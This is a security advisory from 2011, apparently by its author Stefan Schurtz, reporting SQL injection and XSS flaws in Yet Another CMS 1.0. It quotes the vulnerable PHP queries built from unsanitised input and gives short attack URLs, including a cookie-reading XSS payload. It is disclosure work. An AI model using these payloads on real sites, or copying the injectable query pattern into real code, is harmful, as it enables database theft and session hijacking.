@@ -1,0 +1,96 @@
+Advisory:              	Yet Another CMS 1.0 SQL Injection & XSS vulnerabilities
+Advisory ID:           	SSCHADV2011-031
+Author:                	Stefan Schurtz
+Affected Software:  	Successfully tested on Yet Another CMS 1.0
+Vendor URL:          	http://yetanothercms.codeplex.com/
+Vendor Status:       	informed
+
+==========================
+Vulnerability Description:
+==========================
+
+Yet Another CMS 1.0 is prone to multiple SQL Injection and XSS vulnerabilities
+
+==================
+Technical Details:
+==================
+
+// search.php
+$result_set = get_search_result_set($_POST['pattern']);
+
+// includes/functions.php
+function get_search_result_set($pattern, $public = true) {
+      global $connection;
+      $query = "SELECT
+                   id,
+                   subject_id,
+                   menu_name,
+                   position,
+                   visible,
+                   content,
+                   CONCAT('... ', SUBSTRING(content, LOCATE('" . $pattern . "',content), 200), ' ...') as fragment
+                FROM
+                   pages
+                WHERE
+                   content like '%" . $pattern . "%'";
+
+// index.php
+<?php find_selected_page(); ?>
+
+// includes/functions.php
+function find_selected_page() {
+                global $sel_subject;
+                global $sel_page;
+                if (isset($_GET['subj'])) {
+                        $sel_subject = get_subject_by_id($_GET['subj']);
+                        $sel_page = get_default_page($sel_subject['id']);
+                } elseif (isset($_GET['page'])) {
+                        $sel_subject = NULL;
+                        $sel_page = get_page_by_id($_GET['page']);
+                } else {
+                        $sel_subject = NULL;
+                        $sel_page = NULL;
+                }
+}
+
+
+function get_page_by_id($page_id) {
+                global $connection;
+                $query = "SELECT * ";
+                $query .= "FROM pages ";
+                $query .= "WHERE id=" . $page_id ." ";
+                $query .= "LIMIT 1";
+
+==================
+Exploit
+==================
+
+SQL Injection
+
+http://<target>/index.php?page=[sql injection]
+http://<target>/search.php -> 'search field' -> [sql injection]
+
+XSS
+
+http://<target>/search.php -> 'search field' -> '"</script><script>alert(document.cookie)</script>
+http://<target>/index.php?page='</script><script>alert(document.cookie)</script>
+
+====================
+Disclosure Timeline:
+====================
+
+18-Oct-2011 - informed developers
+
+========
+Credits:
+========
+
+Vulnerabilities found and advisory written by Stefan Schurtz.
+
+===========
+References:
+===========
+
+http://yetanothercms.codeplex.com/
+http://yetanothercms.codeplex.com/workitem/643
+http://www.rul3z.de/advisories/SSCHADV2011-031.txt
